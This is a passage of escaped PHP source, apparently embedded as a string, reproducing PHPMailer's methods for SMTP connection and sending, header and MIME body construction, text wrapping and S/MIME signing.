setSMTPInstance(SMTP \$smtp)\r\n    {\r\n        \$this->smtp = \$smtp;\r\n        return \$this->smtp;\r\n    }\r\n    protected function smtpSend(\$header, \$body)\r\n    {\r\n        \$bad_rcpt = [];\r\n        if (!\$this->smtpConnect(\$this->SMTPOptions)) {\r\n            throw new Exception(\$this->lang('smtp_connect_failed'), self::STOP_CRITICAL);\r\n        }\r\n        if ('' == \$this->Sender) {\r\n            \$smtp_from = \$this->From;\r\n        } else {\r\n            \$smtp_from = \$this->Sender;\r\n        }\r\n        if (!\$this\r\n            ->smtp\r\n            ->mail(\$smtp_from)) {\r\n            \$this->setError(\$this->lang('from_failed') . \$smtp_from . ' : ' . implode(',', \$this\r\n                ->smtp\r\n                ->getError()));\r\n            throw new Exception(\$this->ErrorInfo, self::STOP_CRITICAL);\r\n        }\r\n        \$callbacks = [];\r\n        foreach ([\$this->to, \$this->cc, \$this\r\n            ->bcc] as \$togroup) {\r\n            foreach (\$togroup as \$to) {\r\n                if (!\$this\r\n                    ->smtp\r\n                    ->recipient(\$to[0], \$this->dsn)) {\r\n                    \$error = \$this\r\n                        ->smtp\r\n                        ->getError();\r\n                    \$bad_rcpt[] = ['to' => \$to[0], 'error' => \$error['detail']];\r\n                    \$isSent = false;\r\n                } else {\r\n                    \$isSent = true;\r\n                }\r\n                \$callbacks[] = ['issent' => \$isSent, 'to' => \$to[0]];\r\n            }\r\n        }\r\n        if ((count(\$this->all_recipients) > count(\$bad_rcpt)) and !\$this\r\n            ->smtp\r\n            ->data(\$header . \$body)) {\r\n            throw new Exception(\$this->lang('data_not_accepted'), self::STOP_CRITICAL);\r\n        }\r\n        \$smtp_transaction_id = \$this\r\n            ->smtp\r\n            ->getLastTransactionID();\r\n        if (\$this->SMTPKeepAlive) {\r\n            \$this\r\n                ->smtp\r\n                ->reset();\r\n        } else {\r\n            \$this\r\n                ->smtp\r\n                ->quit();\r\n            \$this\r\n                ->smtp\r\n                ->close();\r\n        }\r\n        foreach (\$callbacks as \$cb) {\r\n            \$this->doCallback(\$cb['issent'], [\$cb['to']], [], [], \$this->Subject, \$body, \$this->From, ['smtp_transaction_id' => \$smtp_transaction_id]);\r\n        }\r\n        if (count(\$bad_rcpt) > 0) {\r\n            \$errstr = '';\r\n            foreach (\$bad_rcpt as \$bad) {\r\n                \$errstr .= \$bad['to'] . ': ' . \$bad['error'];\r\n            }\r\n            throw new Exception(\$this->lang('recipients_failed') . \$errstr, self::STOP_CONTINUE);\r\n        }\r\n        return true;\r\n    }\r\n    public function smtpConnect(\$options = null)\r\n    {\r\n        if (null === \$this->smtp) {\r\n            \$this->smtp = \$this->getSMTPInstance();\r\n        }\r\n        if (null === \$options) {\r\n            \$options = \$this->SMTPOptions;\r\n        }\r\n        if (\$this\r\n            ->smtp\r\n            ->connected()\r\n        ) {\r\n            return true;\r\n        }\r\n        \$this\r\n            ->smtp\r\n            ->setTimeout(\$this->Timeout);\r\n        \$this\r\n            ->smtp\r\n            ->setDebugLevel(\$this->SMTPDebug);\r\n        \$this\r\n            ->smtp\r\n            ->setDebugOutput(\$this->Debugoutput);\r\n        \$this\r\n            ->smtp\r\n            ->setVerp(\$this->do_verp);\r\n        \$hosts = explode(';', \$this->Host);\r\n        \$lastexception = null;\r\n        foreach (\$hosts as \$hostentry) {\r\n            \$hostinfo = [];\r\n            if (!preg_match('/^((ssl|tls):\\/\\/)*([a-zA-Z0-9\\.-]*|\\[[a-fA-F0-9:]+\\]):?([0-9]*)\$/', trim(\$hostentry), \$hostinfo)) {\r\n                static::edebug(\$this->lang('connect_host') . ' ' . \$hostentry);\r\n                continue;\r\n            }\r\n            if (!static::isValidHost(\$hostinfo[3])) {\r\n                static::edebug(\$this->lang('connect_host') . ' ' . \$hostentry);\r\n                continue;\r\n            }\r\n            \$prefix = '';\r\n            \$secure = \$this->SMTPSecure;\r\n            \$tls = ('tls' == \$this->SMTPSecure);\r\n            if ('ssl' == \$hostinfo[2] or ('' == \$hostinfo[2] and 'ssl' == \$this->SMTPSecure)) {\r\n                \$prefix = 'ssl://';\r\n                \$tls = false;\r\n                \$secure = 'ssl';\r\n            } elseif ('tls' == \$hostinfo[2]) {\r\n                \$tls = true;\r\n                \$secure = 'tls';\r\n            }\r\n            \$sslext = defined('OPENSSL_ALGO_SHA256');\r\n            if ('tls' === \$secure or 'ssl' === \$secure) {\r\n                if (!\$sslext) {\r\n                    throw new Exception(\$this->lang('extension_missing') . 'openssl', self::STOP_CRITICAL);\r\n                }\r\n            }\r\n            \$host = \$hostinfo[3];\r\n            \$port = \$this->Port;\r\n            \$tport = (int)\$hostinfo[4];\r\n            if (\$tport > 0 and \$tport < 65536) {\r\n                \$port = \$tport;\r\n            }\r\n            if (\$this\r\n                ->smtp\r\n                ->connect(\$prefix . \$host, \$port, \$this->Timeout, \$options)\r\n            ) {\r\n                try {\r\n                    if (\$this->Helo) {\r\n                        \$hello = \$this->Helo;\r\n                    } else {\r\n                        \$hello = \$this->serverHostname();\r\n                    }\r\n                    \$this\r\n                        ->smtp\r\n                        ->hello(\$hello);\r\n                    if (\$this->SMTPAutoTLS and \$sslext and 'ssl' != \$secure and \$this\r\n                        ->smtp\r\n                        ->getServerExt('STARTTLS')\r\n                    ) {\r\n                        \$tls = true;\r\n                    }\r\n                    if (\$tls) {\r\n                        if (!\$this\r\n                            ->smtp\r\n                            ->startTLS()) {\r\n                            throw new Exception(\$this->lang('connect_host'));\r\n                        }\r\n                        \$this\r\n                            ->smtp\r\n                            ->hello(\$hello);\r\n                    }\r\n                    if (\$this->SMTPAuth) {\r\n                        if (!\$this\r\n                            ->smtp\r\n                            ->authenticate(\$this->Username, \$this->Password, \$this->AuthType, \$this->oauth)) {\r\n                            throw new Exception(\$this->lang('authenticate'));\r\n                        }\r\n                    }\r\n                    return true;\r\n                } catch (Exception \$exc) {\r\n                    \$lastexception = \$exc;\r\n                    \$this->edebug(\$exc->getMessage());\r\n                    \$this\r\n                        ->smtp\r\n                        ->quit();\r\n                }\r\n            }\r\n        }\r\n        \$this\r\n            ->smtp\r\n            ->close();\r\n        if (\$this->exceptions and null !== \$lastexception) {\r\n            throw \$lastexception;\r\n        }\r\n        return false;\r\n    }\r\n    public function smtpClose()\r\n    {\r\n        if (null !== \$this->smtp) {\r\n            if (\$this\r\n                ->smtp\r\n                ->connected()\r\n            ) {\r\n                \$this\r\n                    ->smtp\r\n                    ->quit();\r\n                \$this\r\n                    ->smtp\r\n                    ->close();\r\n            }\r\n        }\r\n    }\r\n    public function setLanguage(\$langcode = 'en', \$lang_path = '')\r\n    {\r\n        \$renamed_langcodes = ['br' => 'pt_br', 'cz' => 'cs', 'dk' => 'da', 'no' => 'nb', 'se' => 'sv', 'rs' => 'sr', 'tg' => 'tl',];\r\n        if (isset(\$renamed_langcodes[\$langcode])) {\r\n            \$langcode = \$renamed_langcodes[\$langcode];\r\n        }\r\n        \$PHPMAILER_LANG = ['authenticate' => 'SMTP Error: Could not authenticate.', 'connect_host' => 'SMTP Error: Could not connect to SMTP host.', 'data_not_accepted' => 'SMTP Error: data not accepted.', 'empty_message' => 'Message body empty', 'encoding' => 'Unknown encoding: ', 'execute' => 'Could not execute: ', 'file_access' => 'Could not access file: ', 'file_open' => 'File Error: Could not open file: ', 'from_failed' => 'The following From address failed: ', 'instantiate' => 'Could not instantiate mail function.', 'invalid_address' => 'Invalid address: ', 'mailer_not_supported' => ' mailer is not supported.', 'provide_address' => 'You mustprovide at least one recipient email address.', 'recipients_failed' => 'SMTP Error: The following recipients failed: ', 'signing' => 'Signing Error: ', 'smtp_connect_failed' => 'SMTP connect() failed.', 'smtp_error' => 'SMTP server error: ', 'variable_set' => 'Cannot set or reset variable: ', 'extension_missing' => 'Extension missing: ',];\r\n        if (empty(\$lang_path)) {\r\n            \$lang_path = dirname(__DIR__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR;\r\n        }\r\n        if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?\$/', \$langcode)) {\r\n            \$langcode = 'en';\r\n        }\r\n        \$foundlang = true;\r\n        \$lang_file = \$lang_path . 'phpmailer.lang-' . \$langcode . '.php';\r\n        if ('en' != \$langcode) {\r\n            if (!static::isPermittedPath(\$lang_file) || !file_exists(\$lang_file)) {\r\n                \$foundlang = false;\r\n            } else {\r\n                \$foundlang = include \$lang_file;\r\n            }\r\n        }\r\n        \$this->language = \$PHPMAILER_LANG;\r\n        return (bool)\$foundlang;\r\n    }\r\n    public function getTranslations()\r\n    {\r\n        return \$this->language;\r\n    }\r\n    public function addrAppend(\$type, \$addr)\r\n    {\r\n        \$addresses = [];\r\n        foreach (\$addr as \$address) {\r\n            \$addresses[] = \$this->addrFormat(\$address);\r\n        }\r\n        return \$type . ': ' . implode(', ', \$addresses) . static::\$LE;\r\n    }\r\n    public function addrFormat(\$addr)\r\n    {\r\n        if (empty(\$addr[1])) {\r\n            return \$this->secureHeader(\$addr[0]);\r\n        }\r\n        return \$this->encodeHeader(\$this->secureHeader(\$addr[1]), 'phrase') . ' <' . \$this->secureHeader(\$addr[0]) . '>';\r\n    }\r\n    public function wrapText(\$message, \$length, \$qp_mode = false)\r\n    {\r\n        if (\$qp_mode) {\r\n            \$soft_break = sprintf(' =%s', static::\$LE);\r\n        } else {\r\n            \$soft_break = static::\$LE;\r\n        }\r\n        \$is_utf8 = static::CHARSET_UTF8 === strtolower(\$this->CharSet);\r\n        \$lelen = strlen(static::\$LE);\r\n        \$crlflen = strlen(static::\$LE);\r\n        \$message = static::normalizeBreaks(\$message);\r\n        if (substr(\$message, -\$lelen) == static::\$LE) {\r\n            \$message = substr(\$message, 0, -\$lelen);\r\n        }\r\n        \$lines = explode(static::\$LE, \$message);\r\n        \$message = '';\r\n        foreach (\$lines as \$line) {\r\n            \$words = explode(' ', \$line);\r\n            \$buf = '';\r\n            \$firstword = true;\r\n            foreach (\$words as \$word) {\r\n                if (\$qp_mode and (strlen(\$word) > \$length)) {\r\n                    \$space_left = \$length - strlen(\$buf) - \$crlflen;\r\n                    if (!\$firstword) {\r\n                        if (\$space_left > 20) {\r\n                            \$len = \$space_left;\r\n                            if (\$is_utf8) {\r\n                                \$len = \$this->utf8CharBoundary(\$word, \$len);\r\n                            } elseif ('=' == substr(\$word, \$len - 1, 1)) {\r\n                                --\$len;\r\n                            } elseif ('=' == substr(\$word, \$len - 2, 1)) {\r\n                                \$len -= 2;\r\n                            }\r\n                            \$part = substr(\$word, 0, \$len);\r\n                            \$word = substr(\$word, \$len);\r\n                            \$buf .= ' ' . \$part;\r\n                            \$message .= \$buf . sprintf('=%s', static::\$LE);\r\n                        } else {\r\n                            \$message .= \$buf . \$soft_break;\r\n                        }\r\n                        \$buf = '';\r\n                    }\r\n                    while (strlen(\$word) > 0) {\r\n                        if (\$length <= 0) {\r\n                            break;\r\n                        }\r\n                        \$len = \$length;\r\n                        if (\$is_utf8) {\r\n                            \$len = \$this->utf8CharBoundary(\$word, \$len);\r\n                        } elseif ('=' == substr(\$word, \$len - 1, 1)) {\r\n                            --\$len;\r\n                        } elseif ('=' == substr(\$word, \$len - 2, 1)) {\r\n                            \$len -= 2;\r\n                        }\r\n                        \$part = substr(\$word, 0, \$len);\r\n                        \$word = substr(\$word, \$len);\r\n                        if (strlen(\$word) > 0) {\r\n                            \$message .= \$part . sprintf('=%s', static::\$LE);\r\n                        } else {\r\n                            \$buf = \$part;\r\n                        }\r\n                    }\r\n                } else {\r\n                    \$buf_o = \$buf;\r\n                    if (!\$firstword) {\r\n                        \$buf .= ' ';\r\n                    }\r\n                    \$buf .= \$word;\r\n                    if (strlen(\$buf) > \$length and '' != \$buf_o) {\r\n                        \$message .= \$buf_o . \$soft_break;\r\n                        \$buf = \$word;\r\n                    }\r\n                }\r\n                \$firstword = false;\r\n            }\r\n            \$message .= \$buf . static::\$LE;\r\n        }\r\n        return \$message;\r\n    }\r\n    public function utf8CharBoundary(\$encodedText, \$maxLength)\r\n    {\r\n        \$foundSplitPos = false;\r\n        \$lookBack = 3;\r\n        while (!\$foundSplitPos) {\r\n            \$lastChunk = substr(\$encodedText, \$maxLength - \$lookBack, \$lookBack);\r\n            \$encodedCharPos = strpos(\$lastChunk, '=');\r\n            if (false !== \$encodedCharPos) {\r\n                \$hex = substr(\$encodedText, \$maxLength - \$lookBack + \$encodedCharPos + 1, 2);\r\n                \$dec = hexdec(\$hex);\r\n                if (\$dec < 128) {\r\n                    if (\$encodedCharPos > 0) {\r\n                        \$maxLength -= \$lookBack - \$encodedCharPos;\r\n                    }\r\n                    \$foundSplitPos = true;\r\n                } elseif (\$dec >= 192) {\r\n                    \$maxLength -= \$lookBack - \$encodedCharPos;\r\n                    \$foundSplitPos = true;\r\n                } elseif (\$dec < 192) {\r\n                    \$lookBack += 3;\r\n                }\r\n            } else {\r\n                \$foundSplitPos = true;\r\n            }\r\n        }\r\n        return \$maxLength;\r\n    }\r\n    public function setWordWrap()\r\n    {\r\n        if (\$this->WordWrap < 1) {\r\n            return;\r\n        }\r\n        switch (\$this->message_type) {\r\n            case 'alt':\r\n            case 'alt_inline':\r\n            case 'alt_attach':\r\n            case 'alt_inline_attach':\r\n                \$this->AltBody = \$this->wrapText(\$this->AltBody, \$this->WordWrap);\r\n                break;\r\n            default:\r\n                \$this->Body = \$this->wrapText(\$this->Body, \$this->WordWrap);\r\n                break;\r\n        }\r\n    }\r\n    public function createHeader()\r\n    {\r\n        \$result = '';\r\n        \$result .= \$this->headerLine('Date', '' == \$this->MessageDate ? self::rfcDate() : \$this->MessageDate);\r\n        if (\$this->SingleTo) {\r\n            if ('mail' != \$this->Mailer) {\r\n                foreach (\$this->to as \$toaddr) {\r\n                    \$this->SingleToArray[] = \$this->addrFormat(\$toaddr);\r\n                }\r\n            }\r\n        } else {\r\n            if (count(\$this->to) > 0) {\r\n                if ('mail' != \$this->Mailer) {\r\n                    \$result .= \$this->addrAppend('To', \$this->to);\r\n                }\r\n            } elseif (count(\$this->cc) == 0) {\r\n                \$result .= \$this->headerLine('To', 'undisclosed-recipients:;');\r\n            }\r\n        }\r\n        \$result .= \$this->addrAppend('From', [[trim(\$this->From), \$this->FromName]]);\r\n        if (count(\$this->cc) > 0) {\r\n            \$result .= \$this->addrAppend('Cc', \$this->cc);\r\n        }\r\n        if (('sendmail' == \$this->Mailer or 'qmail' == \$this->Mailer or 'mail' == \$this->Mailer) and count(\$this->bcc) > 0) {\r\n            \$result .= \$this->addrAppend('Bcc', \$this->bcc);\r\n        }\r\n        if (count(\$this->ReplyTo) > 0) {\r\n            \$result .= \$this->addrAppend('Reply-To', \$this->ReplyTo);\r\n        }\r\n        if ('mail' != \$this->Mailer) {\r\n            \$result .= \$this->headerLine('Subject', \$this->encodeHeader(\$this->secureHeader(\$this->Subject)));\r\n        }\r\n        if ('' != \$this->MessageID and preg_match('/^<.*@.*>\$/', \$this->MessageID)) {\r\n            \$this->lastMessageID = \$this->MessageID;\r\n        } else {\r\n            \$this->lastMessageID = sprintf('<%s@%s>', \$this->uniqueid, \$this->serverHostname());\r\n        }\r\n        \$result .= \$this->headerLine('Message-ID', \$this->lastMessageID);\r\n        if (null !== \$this->Priority) {\r\n            \$result .= \$this->headerLine('X-Priority', \$this->Priority);\r\n        }\r\n        if ('' == \$this->XMailer) {\r\n            \$result .= \$this->headerLine('X-Mailer', '??1?' . self::VERSION . '??');\r\n        } else {\r\n            \$myXmailer = trim(\$this->XMailer);\r\n            if (\$myXmailer) {\r\n                \$result .= \$this->headerLine('X-Mailer', \$myXmailer);\r\n            }\r\n        }\r\n        if ('' != \$this->ConfirmReadingTo) {\r\n            \$result .= \$this->headerLine('Disposition-Notification-To', '<' . \$this->ConfirmReadingTo . '>');\r\n        }\r\n        foreach (\$this->CustomHeader as \$header) {\r\n            \$result .= \$this->headerLine(trim(\$header[0]), \$this->encodeHeader(trim(\$header[1])));\r\n        }\r\n        if (!\$this->sign_key_file) {\r\n            \$result .= \$this->headerLine('MIME-Version', '1.0');\r\n            \$result .= \$this->getMailMIME();\r\n        }\r\n        return \$result;\r\n    }\r\n    public function getMailMIME()\r\n    {\r\n        \$result = '';\r\n        \$ismultipart = true;\r\n        switch (\$this->message_type) {\r\n            case 'inline':\r\n                \$result .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';');\r\n                \$result .= \$this->textLine(' boundary=\"' . \$this->boundary[1] . '\"');\r\n                break;\r\n            case 'attach':\r\n            case 'inline_attach':\r\n            case 'alt_attach':\r\n            case 'alt_inline_attach':\r\n                \$result .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_MIXED . ';');\r\n                \$result .= \$this->textLine(' boundary=\"' . \$this->boundary[1] . '\"');\r\n                break;\r\n            case 'alt':\r\n            case 'alt_inline':\r\n                \$result .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';');\r\n                \$result .= \$this->textLine(' boundary=\"' . \$this->boundary[1] . '\"');\r\n                break;\r\n            default:\r\n                \$result .= \$this->textLine('Content-Type: ' . \$this->ContentType . '; charset=' . \$this->CharSet);\r\n                \$ismultipart = false;\r\n                break;\r\n        }\r\n        if (static::ENCODING_7BIT != \$this->Encoding) {\r\n            if (\$ismultipart) {\r\n                if (static::ENCODING_8BIT == \$this->Encoding) {\r\n                    \$result .= \$this->headerLine('Content-Transfer-Encoding', static::ENCODING_8BIT);\r\n                }\r\n            } else {\r\n                \$result .= \$this->headerLine('Content-Transfer-Encoding', \$this->Encoding);\r\n            }\r\n        }\r\n        if ('mail' != \$this->Mailer) {\r\n            \$result .= static::\$LE;\r\n        }\r\n        return \$result;\r\n    }\r\n    public function getSentMIMEMessage()\r\n    {\r\n        return rtrim(\$this->MIMEHeader . \$this->mailHeader, \"\\n\\r\") . static::\$LE . static::\$LE . \$this->MIMEBody;\r\n    }\r\n    protected function generateId()\r\n    {\r\n        \$len = 32;\r\n        if (function_exists('random_bytes')) {\r\n            \$bytes = random_bytes(\$len);\r\n        } elseif (function_exists('openssl_random_pseudo_bytes')) {\r\n            \$bytes = openssl_random_pseudo_bytes(\$len);\r\n        } else {\r\n            \$bytes = hash('sha256', uniqid((string)mt_rand(), true), true);\r\n        }\r\n        return str_replace(['=', '+', '/'], '', base64_encode(hash('sha256', \$bytes, true)));\r\n    }\r\n    public function createBody()\r\n    {\r\n        \$body = '';\r\n        \$this->uniqueid = \$this->generateId();\r\n        \$this->boundary[1] = 'b1_' . \$this->uniqueid;\r\n        \$this->boundary[2] = 'b2_' . \$this->uniqueid;\r\n        \$this->boundary[3] = 'b3_' . \$this->uniqueid;\r\n        if (\$this->sign_key_file) {\r\n            \$body .= \$this->getMailMIME() . static::\$LE;\r\n        }\r\n        \$this->setWordWrap();\r\n        \$bodyEncoding = \$this->Encoding;\r\n        \$bodyCharSet = \$this->CharSet;\r\n        if (static::ENCODING_8BIT == \$bodyEncoding and !\$this->has8bitChars(\$this->Body)) {\r\n            \$bodyEncoding = static::ENCODING_7BIT;\r\n            \$bodyCharSet = 'us-ascii';\r\n        }\r\n        if (static::ENCODING_BASE64 != \$this->Encoding and static::hasLineLongerThanMax(\$this->Body)) {\r\n            \$bodyEncoding = static::ENCODING_QUOTED_PRINTABLE;\r\n        }\r\n        \$altBodyEncoding = \$this->Encoding;\r\n        \$altBodyCharSet = \$this->CharSet;\r\n        if (static::ENCODING_8BIT == \$altBodyEncoding and !\$this->has8bitChars(\$this->AltBody)) {\r\n            \$altBodyEncoding = static::ENCODING_7BIT;\r\n            \$altBodyCharSet = 'us-ascii';\r\n        }\r\n        if (static::ENCODING_BASE64 != \$altBodyEncoding and static::hasLineLongerThanMax(\$this->AltBody)) {\r\n            \$altBodyEncoding = static::ENCODING_QUOTED_PRINTABLE;\r\n        }\r\n        \$mimepre = 'This is a multi-part message in MIME format.' . static::\$LE;\r\n        switch (\$this->message_type) {\r\n            case 'inline':\r\n                \$body .= \$mimepre;\r\n                \$body .= \$this->getBoundary(\$this->boundary[1], \$bodyCharSet, '', \$bodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->Body, \$bodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('inline', \$this->boundary[1]);\r\n                break;\r\n            case 'attach':\r\n                \$body .= \$mimepre;\r\n                \$body .= \$this->getBoundary(\$this->boundary[1], \$bodyCharSet, '', \$bodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->Body, \$bodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('attachment', \$this->boundary[1]);\r\n                break;\r\n            case 'inline_attach':\r\n                \$body .= \$mimepre;\r\n                \$body .= \$this->textLine('--' . \$this->boundary[1]);\r\n                \$body .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';');\r\n                \$body .= \$this->textLine(' boundary=\"' . \$this->boundary[2] . '\";');\r\n                \$body .= \$this->textLine(' type=\"' . static::CONTENT_TYPE_TEXT_HTML . '\"');\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->getBoundary(\$this->boundary[2], \$bodyCharSet, '', \$bodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->Body, \$bodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('inline', \$this->boundary[2]);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('attachment', \$this->boundary[1]);\r\n                break;\r\n            case 'alt':\r\n                \$body .= \$mimepre;\r\n                \$body .= \$this->getBoundary(\$this->boundary[1], \$altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, \$altBodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->AltBody, \$altBodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->getBoundary(\$this->boundary[1], \$bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, \$bodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->Body, \$bodyEncoding);\r\n                \$body .= static::\$LE;\r\n                if (!empty(\$this->Ical)) {\r\n                    \$body .= \$this->getBoundary(\$this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=REQUEST', '');\r\n                    \$body .= \$this->encodeString(\$this->Ical, \$this->Encoding);\r\n                    \$body .= static::\$LE;\r\n                }\r\n                \$body .= \$this->endBoundary(\$this->boundary[1]);\r\n                break;\r\n            case 'alt_inline':\r\n                \$body .= \$mimepre;\r\n                \$body .= \$this->getBoundary(\$this->boundary[1], \$altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, \$altBodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->AltBody, \$altBodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->textLine('--' . \$this->boundary[1]);\r\n                \$body .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';');\r\n                \$body .= \$this->textLine(' boundary=\"' . \$this->boundary[2] . '\";');\r\n                \$body .= \$this->textLine(' type=\"' . static::CONTENT_TYPE_TEXT_HTML . '\"');\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->getBoundary(\$this->boundary[2], \$bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, \$bodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->Body, \$bodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('inline', \$this->boundary[2]);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->endBoundary(\$this->boundary[1]);\r\n                break;\r\n            case 'alt_attach':\r\n                \$body .= \$mimepre;\r\n                \$body .= \$this->textLine('--' . \$this->boundary[1]);\r\n                \$body .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';');\r\n                \$body .= \$this->textLine(' boundary=\"' . \$this->boundary[2] . '\"');\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->getBoundary(\$this->boundary[2], \$altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, \$altBodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->AltBody, \$altBodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->getBoundary(\$this->boundary[2], \$bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, \$bodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->Body, \$bodyEncoding);\r\n                \$body .= static::\$LE;\r\n                if (!empty(\$this->Ical)) {\r\n                    \$body .= \$this->getBoundary(\$this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=REQUEST', '');\r\n                    \$body .= \$this->encodeString(\$this->Ical, \$this->Encoding);\r\n                }\r\n                \$body .= \$this->endBoundary(\$this->boundary[2]);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('attachment', \$this->boundary[1]);\r\n                break;\r\n            case 'alt_inline_attach':\r\n                \$body .= \$mimepre;\r\n                \$body .= \$this->textLine('--' . \$this->boundary[1]);\r\n                \$body .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';');\r\n                \$body .= \$this->textLine(' boundary=\"' . \$this->boundary[2] . '\"');\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->getBoundary(\$this->boundary[2], \$altBodyCharSet, static::CONTENT_TYPE_PLAINTEXT, \$altBodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->AltBody, \$altBodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->textLine('--' . \$this->boundary[2]);\r\n                \$body .= \$this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';');\r\n                \$body .= \$this->textLine(' boundary=\"' . \$this->boundary[3] . '\";');\r\n                \$body .= \$this->textLine(' type=\"' . static::CONTENT_TYPE_TEXT_HTML . '\"');\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->getBoundary(\$this->boundary[3], \$bodyCharSet, static::CONTENT_TYPE_TEXT_HTML, \$bodyEncoding);\r\n                \$body .= \$this->encodeString(\$this->Body, \$bodyEncoding);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('inline', \$this->boundary[3]);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->endBoundary(\$this->boundary[2]);\r\n                \$body .= static::\$LE;\r\n                \$body .= \$this->attachAll('attachment', \$this->boundary[1]);\r\n                break;\r\n            default:\r\n                \$this->Encoding = \$bodyEncoding;\r\n                \$body .= \$this->encodeString(\$this->Body, \$this->Encoding);\r\n                break;\r\n        }\r\n        if (\$this->isError()) {\r\n            \$body = '';\r\n            if (\$this->exceptions) {\r\n                throw new Exception(\$this->lang('empty_message'), self::STOP_CRITICAL);\r\n            }\r\n        } elseif (\$this->sign_key_file) {\r\n            try {\r\n                if (!defined('PKCS7_TEXT')) {\r\n                    throw new Exception(\$this->lang('extension_missing') . 'openssl');\r\n                }\r\n                \$file = fopen('php://temp', 'rb+');\r\n                \$signed = fopen('php://temp', 'rb+');\r\n                fwrite(\$file, \$body);\r\n                if (empty(\$this->sign_extracerts_file)) {\r\n                    \$sign = @openssl_pkcs7_sign(\$file, \$signed, 'file://' . realpath(\$this->sign_cert_file), ['file://' . realpath(\$this->sign_key_file), \$this->sign_key_pass], []);\r\n                } else {\r\n                    \$sign = @openssl_pkcs7_sign(\$file, \$signed, 'file://' . realpath(\$this->sign_cert_file), ['file://' . realpath(\$this->sign_key_file), \$this->sign_key_pass], [], PKCS7_DETACHED, \$this->sign_extracerts_file);\r\n                }\r\n                fclose(\$file);\r\n                if (\$sign) {\r\n                    \$body = file_get_contents(\$signed);\r\n                    fclose(\$signed);\r\n                    \$parts = explode(\"\\n\\n\", \$body, 2);\r\n                    \$this->MIMEHeader .= \$parts[0] . static::\$LE . static::\$LE;\r\n                    \$body = \$parts[1];\r\n                } else {\r\n                    fclose(\$signed);\r\n                    throw new Exception(\$this->lang('signing') . openssl_error_string());\r\n                }\r\n            } catch (Exception \$exc) {\r\n                \$body = '';\r\n                if (\$this->exceptions) {\r\n                    throw \$exc;\r\n                }\r\n            }\r\n        }\r\n        return \$body;\r\n    }\r\n    protected function getBoundary(\$boundary, \$charSet, \$contentType, \$encoding)\r\n    {\r\n        \$result = '';\r\n        if ('' == \$charSet) {\r\n            \$charSet = \$this->CharSet;\r\n        }\r\n        if ('' == \$contentType) {\r\n            \$contentType = \$this->ContentType;\r\n        }\r\n        if ('' == \$encoding) {\r\n            \$encoding = \$this->Encoding;\r\n        }\r\n        \$result .= \$this->textLine('--' . \$boundary);\r\n        \$result .= sprintf('Content-Type: %s; charset=%s', \$contentType, \$charSet);\r\n        \$result .= static::\$LE;\r\n        if (static::ENCODING_7BIT != \$encoding) {\r\n            \$result .= \$this->headerLine('Content-Transfer-Encoding', \$encoding);\r\n        }\r\n        \$result .= static::\$LE;\r\n        return \$result;\r\n    }\r\n    protected function endBoundary(\$boundary)\r\n    {\r\n        return static::\$LE . '--' . \$boundary . '--' . static::\$LE;\r\n    }\r\n    protected function setMessageType()\r\n    {\r\n        \$type = [];\r\n        if (\$this->alternativeExists()) {\r\n            \$type[] = 'alt';\r\n        }\r\n        if (\$this->inlineImageExists()) {\r\n            \$type[] = 'inline';\r\n        }\r\n        if (\$this->attachmentExists()) {\r\n            \$type[] = 'attach';\r\n        }\r\n        \$this->message_type = implode('_', \$type);\r\n        if ('' == \$this->message_type) {\r\n            \$this->message_type = 'plain';\r\n        }\r\n    }\r\n    public function headerLine(\$name, \$value)\r\n    {\r\n        return \$name . ': ' . \$value . static::\$LE;\r\n    }\r\n    public function textLine(\$value)\r\n    {\r\n        return \$value . static::\$LE;\r\n    }\r\n    public function addAttachment(\$path, \$name = '', \$encoding = self::ENCODING_BASE64, \$type = '', \$disposition = 'attachment')\r\n    